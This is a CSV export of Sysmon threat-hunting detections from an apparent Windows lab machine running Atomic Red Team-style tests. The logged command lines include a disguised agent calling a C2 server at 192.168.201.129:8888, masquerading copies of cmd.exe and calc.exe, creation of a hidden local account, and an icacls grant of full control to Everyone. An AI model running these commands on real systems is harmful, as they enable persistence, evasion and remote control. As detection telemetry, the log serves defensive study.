"2025-12-23 14:13:57.689 +01:00","Creation of an Executable by an Executable","low","DESKTOP-G2OBL3D","Sysmon",11,"ResDev","T1587.001","detection.threat-hunting ¦ sysmon",172694,"Path: C:\Windows\System32\1db90b_T1036.003.exe ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:13:57.688 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:57.688","file_event_win_susp_binary_dropper.yml","399dee28-dfcb-7990-c7e4-e206e0a2ac29","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.983 +01:00","Creation of an Executable by an Executable","low","DESKTOP-G2OBL3D","Sysmon",11,"ResDev","T1587.001","detection.threat-hunting ¦ sysmon",172705,"Path: C:\lsm.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300","CreationUtcTime: 2025-12-23 13:16:21.982 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:16:21.982","file_event_win_susp_binary_dropper.yml","399dee28-dfcb-7990-c7e4-e206e0a2ac29","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.945 +01:00","CMD Shell Output Redirect","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","detection.threat-hunting ¦ sysmon",172704,"Cmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.934","proc_creation_win_cmd_redirect.yml","a6b1e917-0ba2-8053-6e08-68a1c0b6b763","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.952 +01:00","Net.EXE Execution","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc ¦ LatMov","T1007 ¦ T1049 ¦ T1018 ¦ T1135 ¦ T1201 ¦ T1069.001 ¦ T1069.002 ¦ T1087.001 ¦ T1087.002 ¦ T1021.002 ¦ S0039","detection.threat-hunting ¦ sysmon",172702,"Cmdline: net user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1652 ¦ PGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ ParentPID: 2620 ¦ ParentPGUID: E9F06A57-95FC-694A-DC02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0E6C2EDA203E61C8AB3B5FAF6E3F49A7,SHA256=63A96F43EB673FD465A4238E3A2BBFE5273B858D806A58375BA1520CE097CDF4,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.950","proc_creation_win_net_execution.yml","6be034ef-d875-01a8-3667-a9e297d1df79","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:15:40.985 +01:00","Net.EXE Execution","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc ¦ LatMov","T1007 ¦ T1049 ¦ T1018 ¦ T1135 ¦ T1201 ¦ T1069.001 ¦ T1069.002 ¦ T1087.001 ¦ T1087.002 ¦ T1021.002 ¦ S0039","detection.threat-hunting ¦ sysmon",172703,"Cmdline: C:\WINDOWS\system32\net1 user $ ATOMIC123! /add /active:yes ¦ Proc: C:\Windows\System32\net1.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: net user $ ATOMIC123! /add /active:yes ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3268 ¦ PGUID: E9F06A57-95FC-694A-DE02-000000002300 ¦ ParentPID: 1652 ¦ ParentPGUID: E9F06A57-95FC-694A-DD02-000000002300 ¦ Description: Net Command ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: net1.exe ¦ ParentImage: C:\Windows\System32\net.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:15:40.982","proc_creation_win_net_execution.yml","6be034ef-d875-01a8-3667-a9e297d1df79","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:14.433 +01:00","File or Folder Permissions Modifications","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1222.001","detection.threat-hunting ¦ sysmon",172636,"Cmdline: icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q ¦ Proc: C:\Windows\System32\icacls.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4760 ¦ PGUID: E9F06A57-9402-694A-B002-000000002300 ¦ ParentPID: 1764 ¦ ParentPGUID: E9F06A57-9402-694A-AF02-000000002300 ¦ Description: - ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=512571E55EE542F7F477DB463385CA92,SHA256=CB9E55D4C02F4E55100724D2DA9A1267F49E196BD39FCDF36CEC6EA6314FAD2A,IMPHASH=1F9D15E7251963F81D67B888B965F5D1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: iCACLS.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:14.431","proc_creation_win_susp_file_permission_modifications.yml","7c429190-caac-290e-c8e5-25023b78794b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.684 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",172680,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4556 ¦ PGUID: E9F06A57-9549-694A-CC02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.597","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.865 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",172681,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4060 ¦ PGUID: E9F06A57-9549-694A-CD02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.864","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.928 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",172682,"Cmdline: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs"" ¦ Proc: C:\Windows\System32\wscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4800 ¦ PGUID: E9F06A57-9549-694A-CE02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Microsoft ® Windows Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=A90DAAA8EE522A533588B9E63C55F605,SHA256=32B34E9FE145A550782EC2AA982894D2F183F4A7068641CF98A02ACE14DD999A,IMPHASH=72B04FD87C15A84B6C876E835F21F6E1","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: wscript.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.926","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\mc_defense.evtx"
